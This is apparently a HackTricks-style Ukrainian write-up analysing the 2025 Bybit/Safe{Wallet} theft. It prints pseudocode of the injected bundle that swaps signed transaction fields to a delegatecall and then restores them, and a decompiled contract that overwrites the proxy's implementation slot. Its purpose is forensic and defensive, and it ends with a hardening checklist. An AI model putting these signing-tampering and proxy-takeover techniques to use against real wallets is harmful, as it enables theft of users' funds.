# Компрометація процесу підписання Web3 і захоплення proxy через безпечний Delegatecall

## Огляд

Ланцюжок крадіжки з cold-wallet поєднав **компрометацію supply chain веб-інтерфейсу Safe{Wallet}** з **on-chain примітивом delegatecall, який перезаписав вказівник implementation proxy (slot 0)**. Основні висновки:

- Якщо dApp може впровадити код у процес підписання, він може змусити підписанта створити дійсний **EIP-712 signature із полями, вибраними атакувальником**, одночасно відновивши початкові дані UI, щоб інші підписанти нічого не помітили.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- Safe proxies зберігають `masterCopy` (implementation) у **storage slot 0**. Delegatecall до контракту, який записує дані в slot 0, фактично “оновлює” Safe до логіки атакувальника, надаючи повний контроль над wallet.<sup>[[3]](#references)</sup>

## Off-chain: цілеспрямована мутація підписання в Safe{Wallet}

Підроблений Safe bundle (`_app-*.js`) вибірково атакував певні адреси Safe і підписантів. Впроваджена логіка виконувалася безпосередньо перед викликом підписання:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Властивості атаки
- **Керована контекстом**: жорстко задані allowlist-и для Safe/підписантів-жертв запобігали зайвому шуму та знижували ймовірність виявлення.<sup>[[1]](#references)[[3]](#references)</sup>
- **Мутація в останній момент**: поля (`to`, `data`, `operation`, gas) перезаписувалися безпосередньо перед `signTransaction`, а потім відновлювалися, тому payload-и пропозицій у UI виглядали безпечно, тоді як підписи відповідали payload-у зловмисника.<sup>[[3]](#references)</sup>
- **Непрозорість EIP-712**: wallets показували структуровані дані, але не декодували вкладений calldata і не виділяли `operation = delegatecall`, унаслідок чого мутоване повідомлення фактично підписувалося всліпу.<sup>[[3]](#references)[[4]](#references)</sup>

### Значення валідації Gateway
Пропозиції Safe надсилаються до **Safe Client Gateway**.<sup>[[5]](#references)</sup> До впровадження посилених перевірок Gateway міг прийняти пропозицію, у якій `safeTxHash`/підпис відповідали іншим полям, ніж JSON body, якщо UI переписував їх після підписання. Після інциденту Gateway тепер відхиляє пропозиції, хеш/підпис яких не відповідає надісланій транзакції.<sup>[[3]](#references)</sup> Аналогічну server-side перевірку хешу слід застосовувати до будь-якого API для оркестрації підписання.

### Основні моменти інциденту Bybit/Safe 2025 року
- Виведення коштів із cold wallet Bybit 21 лютого 2025 року (~401 тис. ETH) повторило ту саму схему: скомпрометований Safe S3 bundle спрацьовував лише для підписантів Bybit і змінював `operation=0` → `1`, спрямовуючи `to` на попередньо розгорнутий контракт зловмисника, який записує в slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- Кешований Wayback `_app-52c9031bfa03da47.js` показує, що логіка була прив’язана до Safe Bybit (`0x1db9…cf4`) та адрес підписантів, після чого через дві хвилини після виконання одразу повернулася до чистого bundle, відтворюючи трюк «mutate → sign → restore».<sup>[[1]](#references)[[2]](#references)</sup>
- Шкідливий контракт (наприклад, `0x9622…c7242`) містив прості функції `sweepETH/sweepERC20` і `transfer(address,uint256)`, яка записує implementation slot. Виконання `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` змінило implementation проксі та надало повний контроль.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: захоплення проксі через delegatecall і колізію слотів

Проксі Safe зберігають `masterCopy` у **storage slot 0** і делегують усю логіку йому. Оскільки Safe підтримує **`operation = 1` (delegatecall)**, будь-яка підписана транзакція може вказати довільний контракт і виконати його код у контексті storage проксі.<sup>[[3]](#references)</sup>

Контракт зловмисника імітував ERC-20 `transfer(address,uint256)`, але натомість записував `_to` у slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Шлях виконання:<sup>[[1]](#references)[[3]](#references)</sup>
1. Жертви підписують `execTransaction` з `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy перевіряє підписи для цих параметрів.
3. Proxy виконує delegatecall до `attackerContract`; тіло `transfer` записує значення у slot 0.
4. Slot 0 (`masterCopy`) тепер вказує на логіку, контрольовану атакером → **повний takeover гаманця та виведення коштів**.

### Примітки щодо Guard і версій (hardening після інциденту)
- Transaction guards були представлені в Safe v1.3.0 і можуть перевіряти всі параметри `execTransaction` перед виконанням; guard може відхилити `delegatecall` або застосувати policy до destination і calldata. Bybit використовував v1.1.1, яка з'явилася до цього hook.<sup>[[2]](#references)[[6]](#references)</sup>

## Чекліст виявлення та hardening

- **Цілісність UI**: закріплюйте JS assets / SRI; відстежуйте відмінності bundle; вважайте signing UI частиною trust boundary.
- **Валідація під час підписання**: hardware wallets з **EIP-712 clear-signing**; явно відображайте `operation` і декодуйте вкладений calldata. Відхиляйте підписання, коли `operation = 1`, якщо policy це не дозволяє.<sup>[[3]](#references)</sup>
- **Перевірки hash на стороні сервера**: gateways/services, які relay proposals, повинні повторно обчислювати `safeTxHash` і перевіряти, що підписи відповідають надісланим полям.<sup>[[3]](#references)</sup>
- **Policy/allowlists**: preflight rules для `to`, selectors, asset types; забороняйте delegatecall, окрім перевірених flows. Вимагайте internal policy service перед broadcasting повністю підписаних transactions.
- **Дизайн контракту**: уникайте відкриття довільного delegatecall у multisig/treasury wallets, якщо це не є суворо необхідним. Розглядайте будь-який implementation pointer як upgrade primitive: захищайте його явним access control і контролюйте delegatecall targets/selectors; саме переміщення pointer в інший slot не є повним захистом.<sup>[[3]](#references)[[6]](#references)</sup>
- **Моніторинг**: створюйте alert для delegatecall executions із wallets, що зберігають treasury funds, а також для proposals, які змінюють `operation` зі звичних `call` patterns.

## References

- [1] [Криміналістичний розбір експлойту Bybit Safe від AnChain.AI](https://www.anchain.ai/blog/bybit)
- [2] [Аналіз компрометації Safe bundle від Zero Hour Technology](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Поглиблений технічний аналіз hack Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Журнал змін Safe smart account v1.3.0 (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
